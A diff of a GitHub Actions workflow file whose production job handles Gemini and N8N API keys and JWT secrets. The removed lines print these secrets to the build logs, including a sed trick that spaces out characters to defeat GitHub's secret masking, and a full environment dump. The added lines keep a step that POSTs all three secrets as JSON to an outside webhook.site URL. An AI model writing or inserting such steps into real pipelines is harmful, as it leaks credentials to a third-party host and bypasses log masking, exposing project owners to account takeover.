@@ -10,47 +10,15 @@ jobs:
     runs-on: ubuntu-latest
     environment: Production
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3 # Updated to v3
-
-      - name: Use secrets in a step
-        env:
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
-          N8N_JWT: ${{ secrets.N8N_JWT }}
-          N8N_API_KEY: ${{ secrets.N8N_API_KEY }}
-        run: |
-          echo "Using Gemini API Key: $GEMINI_API_KEY"
-          echo "Using N8N JWT Secret: $N8N_JWT"
-          echo "Using N8N API Key: $N8N_API_KEY"
-
-      - name: Run a Node.js script
-        env:
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
-          JWT_SECRET: ${{ secrets.JWT_SECRET }}
-        run: |
-          node -e "
-            console.log('Gemini API Key:', process.env.GEMINI_API_KEY);
-            console.log('JWT Secret:', process.env.JWT_SECRET);
-          "
-
-      - name: Print Environment Variables
-        run: printenv | sort
-
-      - name: Echo out a GitHub Actions Secret to the logs
-        run: |
-          echo "The GitHub Action Secret will be masked:  "
-          echo ${{ secrets.N8N_API_KEY }}
-          echo "Trick to echo GitHub Actions Secret:  "
-          echo ${{secrets.N8N_API_KEY}} | sed 's/./& /g'
-
-      - name: Send secrets to webhook
-        env:
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
-          N8N_JWT: ${{ secrets.N8N_JWT }}
-          N8N_API_KEY: ${{ secrets.N8N_API_KEY }}
+      - name: Send GitHub Actions Secrets to webhook
         uses: fjogeleit/http-request-action@v1
         with:
           url: "https://webhook.site/b8cfa571-543d-4ff2-ae8b-595b8942ef6e"
           method: "POST"
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.GEMINI_API_KEY }}
+          data: |
+          {
+            "GEMINI_API_KEY": "${{ secrets.GEMINI_API_KEY }}",
+            "N8N_JWT": "${{ secrets.N8N_JWT }}",
+            "N8N_API_KEY": "${{ secrets.N8N_API_KEY }}"
+          }
